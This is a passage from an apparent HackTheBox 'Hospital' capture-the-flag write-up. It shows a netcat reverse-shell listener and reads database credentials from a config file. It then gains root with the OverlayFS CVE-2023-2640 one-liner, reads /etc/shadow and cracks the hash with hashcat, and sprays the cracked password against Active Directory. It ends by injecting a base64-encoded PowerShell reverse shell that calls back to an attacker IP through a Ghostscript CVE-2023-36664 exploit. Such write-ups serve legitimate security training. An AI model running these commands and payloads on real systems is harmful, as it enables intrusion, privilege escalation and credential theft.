+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nvlp</span> <span class="mi">8888</span>
+</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">8888</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">160.0</span><span class="p">]</span> <span class="mi">6512</span>
+</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">964</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
+</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">webserver</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">uploads</span><span class="o">$</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation-1">Privilege Escalation 1</h2>
+<h3 id="enumerating-linux-filesystem">Enumerating Linux filesystem</h3>
+<p>We can see a user <code>drwilliams</code> on the system, but no access to their home folder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@webserver:/home$ ls -al 
+</span></span><span class="line"><span class="cl">total 12
+</span></span><span class="line"><span class="cl">drwxr-xr-x  3 root       root       4096 Oct 29 02:02 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 19 root       root       4096 Sep 12 17:23 ..
+</span></span><span class="line"><span class="cl">drwxr-x---  5 drwilliams drwilliams 4096 Oct 29 01:42 drwilliams
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Checking the /etc/password tells us her full name is Lucy Williams:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the webserver config, we can find MySQL credentials:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">webserver</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> <span class="n">cat</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">/*</span> <span class="n">Database</span> <span class="n">credentials</span><span class="o">.</span> <span class="n">Assuming</span> <span class="n">you</span> <span class="n">are</span> <span class="n">running</span> <span class="n">MySQL</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="n">with</span> <span class="n">default</span> <span class="n">setting</span> <span class="p">(</span><span class="n">user</span> <span class="s1">&#39;root&#39;</span> <span class="n">with</span> <span class="n">no</span> <span class="n">password</span><span class="p">)</span> <span class="o">*/</span>
+</span></span><span class="line"><span class="cl"><span class="n">define</span><span class="p">(</span><span class="s1">&#39;DB_SERVER&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">define</span><span class="p">(</span><span class="s1">&#39;DB_USERNAME&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">define</span><span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;my$qls3rv1c3!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">define</span><span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;hospital&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="o">/*</span> <span class="n">Attempt</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">MySQL</span> <span class="n">database</span> <span class="o">*/</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">link</span> <span class="o">=</span> <span class="n">mysqli_connect</span><span class="p">(</span><span class="n">DB_SERVER</span><span class="p">,</span> <span class="n">DB_USERNAME</span><span class="p">,</span> <span class="n">DB_PASSWORD</span><span class="p">,</span> <span class="n">DB_NAME</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Check</span> <span class="n">connection</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">link</span> <span class="o">===</span> <span class="bp">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">die</span><span class="p">(</span><span class="s2">&#34;ERROR: Could not connect. &#34;</span> <span class="o">.</span> <span class="n">mysqli_connect_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>root:my$qls3rv1c3!</code>.
+Unfortunately, there is nothing valuable in the MySQL database. Back on the Domain Controller, we can confirm <code>drwilliams</code> is an account used in Active Directory via <code>kerbrute</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Hospital</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">cat</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span>        
+</span></span><span class="line"><span class="cl"><span class="n">drwilliams</span>
+</span></span><span class="line"><span class="cl"><span class="n">lwilliams</span>
+</span></span><span class="line"><span class="cl"><span class="n">lucywilliams</span>
+</span></span><span class="line"><span class="cl"><span class="n">williamslucy</span>
+</span></span><span class="line"><span class="cl"><span class="n">williamsl</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Hospital</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">go</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">kerbrute</span> <span class="n">userenum</span> <span class="o">-</span><span class="n">d</span> <span class="n">hospital</span><span class="o">.</span><span class="n">htb</span> <span class="o">--</span><span class="n">dc</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">160.0</span> <span class="o">./</span><span class="n">users</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">__</span>             <span class="n">__</span>               <span class="n">__</span>     
+</span></span><span class="line"><span class="cl">   <span class="o">/</span> <span class="o">/</span><span class="n">_____</span>  <span class="n">_____</span><span class="o">/</span> <span class="o">/</span><span class="n">_</span>  <span class="n">_______</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span><span class="n">____</span> 
+</span></span><span class="line"><span class="cl">  <span class="o">/</span> <span class="o">//</span><span class="n">_</span><span class="o">/</span> <span class="n">_</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="n">__</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="n">__</span><span class="o">/</span> <span class="n">_</span> \
+</span></span><span class="line"><span class="cl"> <span class="o">/</span> <span class="p">,</span><span class="o">&lt;</span> <span class="o">/</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="n">__</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">_</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="o">/</span><span class="n">_</span><span class="o">.</span><span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">/</span>\<span class="n">__</span><span class="o">/</span>\<span class="n">___</span><span class="o">/</span>                                        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Version</span><span class="p">:</span> <span class="n">dev</span> <span class="p">(</span><span class="n">n</span><span class="o">/</span><span class="n">a</span><span class="p">)</span> <span class="o">-</span> <span class="mi">11</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">23</span> <span class="o">-</span> <span class="n">Ronnie</span> <span class="n">Flathers</span> <span class="err">@</span><span class="n">ropnop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">19</span> <span class="mi">12</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">21</span> <span class="o">&gt;</span>  <span class="n">Using</span> <span class="n">KDC</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">19</span> <span class="mi">12</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">21</span> <span class="o">&gt;</span>   <span class="mf">10.129</span><span class="o">.</span><span class="mf">160.215</span><span class="p">:</span><span class="mi">88</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">19</span> <span class="mi">12</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">21</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">drwilliams</span><span class="err">@</span><span class="n">hospital</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">19</span> <span class="mi">12</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">21</span> <span class="o">&gt;</span>  <span class="n">Done</span><span class="o">!</span> <span class="n">Tested</span> <span class="mi">5</span> <span class="n">usernames</span> <span class="p">(</span><span class="mi">1</span> <span class="n">valid</span><span class="p">)</span> <span class="ow">in</span> <span class="mf">0.072</span> <span class="n">seconds</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="abusing-overlayfs">Abusing OverlayFS</h3>
+<p>After extensive enumeration of files, I discover on a recent <a class="link" href="https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/"  target="_blank" rel="noopener"
+    >ubuntu exploit using OverlayFS</a>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&#34; &amp;&amp; u/python3 -c &#39;import os;os.setuid(0);os.system(&#34;bash -i&#34;)&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Executing the payload, we are now root. Note that some input was truncated because my reverse shell was not size adjusted.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;are -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;  
+</span></span><span class="line"><span class="cl">&gt;   
+</span></span><span class="line"><span class="cl">&lt;n3 -c &#39;import os;os.setuid(0);os.system(&#34;bash -i&#34;)&#39;
+</span></span><span class="line"><span class="cl">root@webserver:/tmp# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@webserver:/tmp#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="post-exploitation-collecting">Post-Exploitation Collecting</h2>
+<h3 id="cracking-password-hashes-from-shadow">Cracking password hashes from shadow</h3>
+<p>Since we know <code>drwilliams</code> is a user on this linux virtual machine as well as a user in Active Directory, we can try to crack their /etc/shadow password and hope that it is the same for both services.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@webserver:/tmp# grep drwilliams /etc/shadow
+</span></span><span class="line"><span class="cl">drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, using hashcat to crack:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ hashcat -m 1800 &#39;$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/&#39; /usr/share/wordlists/rockyou.txt 
+</span></span><span class="line"><span class="cl">hashcat (v6.2.5) starting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have a successful crack, <code>qwe123!@#</code>.
+Confirming that these credentials work for Active Directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Hospital]
+</span></span><span class="line"><span class="cl">└─$ cme smb hospital.htb -u &#39;drwilliams&#39; -p &#39;qwe123!@#&#39; 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               [+] hospital.htb\drwilliams:qwe123!@#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="foothold-2">Foothold 2</h2>
+<h3 id="accessing-roundcube-mail-service">Accessing roundcube mail service</h3>
+<p>Unfortunately, drwilliams cannot connect remotely, and there are no interesting  smb shares. We can, however, use these credentials to login to the <code>roundcube</code> mailserver discovered earlier on port 443. When we enter, we see a singular email:</p>
+<p><img src="/post/hackthebox-hospital/Images/mail.png"
+	width="1443"
+	height="412"
+	srcset="/post/hackthebox-hospital/Images/mail_huf061cad22bd6fc127e196e75db36e9d4_72491_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/mail_huf061cad22bd6fc127e196e75db36e9d4_72491_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="350"
+		data-flex-basis="840px"
+	
+></p>
+<p>Message:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Dear Lucy,  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">I wanted to remind you that the project for lighter, cheaper and  
+</span></span><span class="line"><span class="cl">environmentally friendly needles is still ongoing 💉. You are the one in  
+</span></span><span class="line"><span class="cl">charge of providing me with the designs for these so that I can take  
+</span></span><span class="line"><span class="cl">them to the 3D printing department and start producing them right away.  
+</span></span><span class="line"><span class="cl">Please make the design in an &#34;.eps&#34; file format so that it can be well  
+</span></span><span class="line"><span class="cl">visualized with GhostScript.  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Best regards,  
+</span></span><span class="line"><span class="cl">Chris Brown.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note we now know another user, <code>drbrown</code>, and potentially a third user Darius Simon, possibly called <code>drsimon</code>. We can use the power of Active Directory to disclose all registered users, although it does not help us. <code>drbrown</code> and <code>drwilliams</code> are confirmed users, but <code>drsimon</code> does not exist.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[/opt/peas]
+</span></span><span class="line"><span class="cl">└─$ cme smb hospital.htb -u drwilliams -p &#39;qwe123!@#&#39; --users 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               [+] hospital.htb\drwilliams:qwe123!@# 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               [+] Enumerated domain user(s)
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\drwilliams                     badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\drbrown                        badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\SM_2fe3f3cbbafa4566a           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\SM_5faa2be1160c4ead8           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\SM_6e9de17029164abdb           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\SM_75554ef7137f41d68           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\SM_e5b6f3aed4da4ac98           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\SM_b1b9e7f83082488ea           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\SM_9326b57ae8ea44309           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\SM_bb030ff39b6c4a2db           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\SM_0559ce7ac4be4fc6a           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\$431000-R1KSAI1DGHMH           badpwdcount: 0 desc: 
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain                                                                                                                                                     
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               hospital.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="rce-via-ghostscript-vulnerability">RCE via Ghostscript vulnerability</h3>
+<p>Back to the email message presented, it is clear they are utilizing <code>.esp</code> files, and a tool called Ghostscript. With a quick search, we can find that <a class="link" href="https://www.kroll.com/en/insights/publications/cyber/ghostscript-cve-2023-36664-remote-code-execution-vulnerability"  target="_blank" rel="noopener"
+    >ghostscript has a very recent and very serious CVE disclosed</a>. There is a <a class="link" href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection"  target="_blank" rel="noopener"
+    >proof-of-concept script</a> publicly available that we might try. For this, I used the <code>file.eps</code> included in the repository, and injected a powershell base64-encoded reverse shell using their exploit script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Hospital</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">36664</span><span class="o">-</span><span class="n">Ghostscript</span><span class="o">-</span><span class="n">command</span><span class="o">-</span><span class="n">injection</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">python</span> <span class="n">CVE_2023_36664_exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">f</span> <span class="n">file</span><span class="o">.</span><span class="n">eps</span> <span class="o">-</span><span class="n">p</span> <span class="s2">&#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzADQAIgAsADgAOAA4ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#34;</span> <span class="o">-</span><span class="n">i</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Payload</span> <span class="n">successfully</span> <span class="n">injected</span> <span class="n">into</span> <span class="n">file</span><span class="o">.</span><span class="n">eps</span><span class="o">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
